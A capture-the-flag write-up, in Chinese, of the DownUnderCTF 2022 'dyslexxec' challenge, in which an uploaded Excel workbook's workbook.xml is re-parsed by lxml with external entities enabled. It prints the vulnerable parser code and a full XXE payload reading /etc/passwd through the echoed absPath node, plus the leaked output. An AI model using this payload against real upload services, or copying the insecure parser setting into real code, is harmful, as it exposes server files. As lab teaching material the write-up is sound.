# DownUnderCTF 2022 dyslexxec Writeup

## 题目简述

网站允许上传 Excel 工作簿并显示文档元数据。服务先用 `openpyxl` 打开文件，随后从 OOXML 压缩包中单独提取 `xl/workbook.xml`，再用 lxml 解析其中的绝对路径节点。解析器显式启用了 DTD 和外部实体，因此可以通过工作簿中的 XXE 读取服务器文件。

## 解题过程

关键代码是：

```python
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
tree = etree.parse(filename, parser=parser)
internalNode = tree.getroot().find(
    './/{http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac}absPath'
)
```

上传文件必须仍是能被 `openpyxl.load_workbook` 接受的合法工作簿。可以复制题目提供的 `fizzbuzz.xlsm` 或任意正常 XLSX，在 `xl/workbook.xml` 的 XML 声明之后加入外部实体，并把实体引用放入 `x15ac:absPath` 的文本中：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook
  xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
  xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
  xmlns:x15="http://schemas.microsoft.com/office/spreadsheetml/2010/11/main">
  <mc:AlternateContent>
    <mc:Choice Requires="x15">
      <x15ac:absPath
        xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac"
        url="/tmp/">
        &xxe;
      </x15ac:absPath>
    </mc:Choice>
  </mc:AlternateContent>
  <!-- 保留原工作簿其余节点 -->
</workbook>
```

服务端将 `internalNode.text` 放入元数据页面。lxml 展开 `&xxe;` 后，页面会显示 `/etc/passwd`。Dockerfile 把 flag 故意写成一个用户名，因此响应中可看到：

```text
DUCTF{cexxelsyd_work_my_dyslexxec_friend}:x:1001:1001::/tmp:/bin/false
```

flag 为：

```text
DUCTF{cexxelsyd_work_my_dyslexxec_friend}
```

## 方法总结

XLSX/XLSM 本质上是包含多个 XML 的 ZIP 容器，但漏洞并不在 Excel 公式或宏，而在服务器二次解析 `workbook.xml` 时开启了 `load_dtd` 与 `resolve_entities`。构造时既要让整个 OOXML 包通过 `openpyxl` 的首轮校验，也要把实体引用放到应用实际回显的 `absPath` 节点；只在无关 XML 文件中放 XXE 不会产生可见结果。
